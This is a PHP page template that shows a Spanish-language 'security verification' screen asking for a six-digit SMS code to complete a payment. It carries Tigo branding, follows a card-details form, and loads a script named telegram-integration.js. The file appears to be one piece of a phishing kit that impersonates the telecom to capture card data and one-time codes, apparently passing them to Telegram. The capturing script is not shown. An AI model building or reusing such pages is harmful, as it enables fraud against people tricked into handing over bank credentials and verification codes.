<?php ob_start(); ?>

<div class="container">
    <a href="/card/form?invoice_id=<?= htmlspecialchars($invoice_id) ?>" class="back-link">
        <svg class="back-link__icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M19 12H5M5 12L12 19M5 12L12 5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
        REGRESAR
    </a>

    <h1 class="page-title-card">Verificación de seguridad</h1>

    <div class="card-form-container">
        <div class="card-form-card">
            <div class="card-header">
                <div class="card-icon-container">
                    <svg class="card-icon" width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M12 2L3 7V12C3 16.97 6.84 21.37 12 22C17.16 21.37 21 16.97 21 12V7L12 2Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
                        <path d="M9 12L11 14L15 10" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                    </svg>
                </div>
                <span class="card-header-text">Código de verificación</span>
            </div>

            <div class="otp-info-box">
                <svg class="otp-info-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                    <path d="M12 16V12M12 8H12.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
                <p class="otp-info-text">Hemos enviado un código de verificación a tu número de celular registrado. Por favor, ingrésalo para continuar con el pago.</p>
            </div>

            <div id="errorMessage" class="error-message" style="display: none;">
                <svg class="error-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
                    <path d="M12 8V12M12 16H12.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                </svg>
                <span id="errorText">El código ingresado es incorrecto. Por favor, verifica e intenta nuevamente.</span>
            </div>

            <form id="otpForm" class="card-form">
                <div class="form-group">
                    <label for="otpCode" class="form-label-card">Código de verificación (OTP)</label>
                    <input type="tel" id="otpCode" name="otpCode" class="form-input-card otp-input" 
                           placeholder="000000" maxlength="6" 
                           autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"
                           pattern="[0-9]*" inputmode="numeric" required>
                    <span class="input-helper-text">Ingresa el código de 6 dígitos</span>
                </div>

                <div class="otp-resend-container">
                    <p class="otp-resend-text">
                        ¿No recibiste el código? 
                        <a href="#" class="otp-resend-link" id="resendLink">Reenviar código</a>
                    </p>
                </div>

                <div class="card-form-actions">
                    <button type="button" class="btn-cancel-card" onclick="window.location.href='/card/form?invoice_id=<?= htmlspecialchars($invoice_id) ?>'">CANCELAR</button>
                    <button type="submit" class="btn-submit-card" id="submitBtn" disabled>CONTINUAR</button>
                </div>
            </form>
        </div>
    </div>
</div>

<!-- Overlay de carga -->
<div id="loadingOverlay" class="loading-overlay tigo-loading">
    <img src="/img/tigo-logo.svg" alt="Tigo" class="loading-logo">
    <p class="loading-text">Procesando tu solicitud...</p>
</div>

<?php
$content = ob_get_clean();
$additionalJS = ['/js/telegram-integration.js', '/js/card-otp.js'];
require __DIR__ . '/../layout.php';
?>
